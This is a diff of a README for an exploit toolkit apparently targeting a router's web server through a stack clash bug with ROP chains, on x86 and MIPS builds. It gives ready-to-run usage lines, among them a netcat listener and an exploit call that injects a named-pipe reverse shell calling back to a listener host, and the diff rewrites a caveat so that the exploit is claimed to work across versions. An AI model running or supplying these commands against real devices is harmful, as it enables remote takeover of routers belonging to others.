@@ -16,12 +16,13 @@ Simple crash sending -1 as content-length in post header
 ## StackClashPOC  
 Stack clash exploit using two threads, missing ROP chain
 
-## StackClashROPSystem  
+# Working exploits
+## StackClash_x86  
 Stack clash exploit using two threads  with ROP chain to run bash commands  
 
 ### For a reverse shell:  
 ```
-$ nc -l -p 1234
+$ nc -l -p 1234  # (in another shell)
 $ ./StackClashROPsystem.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"
 ```
 Where:  
@@ -44,19 +45,20 @@ To simplify extraction you can use:
 $ ./getROSbin.py 6.38.4 x86 /nova/bin/www www_binary
 ```
 
-## StackClashMIPS  
+## StackClash_mips  
 Stack clash exploit using two threads with ROP chain + shell code to run bash commands  
 On mips version of www the stack is RWX, so we can jump to the stack.
 
 You can run the same bash command as the x86 version.  
-The exploit in NOT dinamically created, so in versions different from 6.38.4 may not works.  
+The exploit is dynamically created, so it should work on any version minor than 6.38.4.  
 
 ### LCD  
 Funny command  
 ```
-$ ./StackClashMIPS.py 192.168.8.1 80 "echo hello world > /dev/lcd"
+$ ./getROSbin.py 6.38.4 mipsbe /nova/bin/www www_binary
+$ ./StackClashMIPS.py 192.168.8.1 80 www_binary "echo hello world > /dev/lcd"
 ```
-![image](https://github.com/BigNerd95/Chimay-Red/raw/master/screen_image.jpg)
+![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/screen_image.jpg)
 
 # FAQ
 #### Where does one get the chimay-red.py file, that this tool kit relies on?  
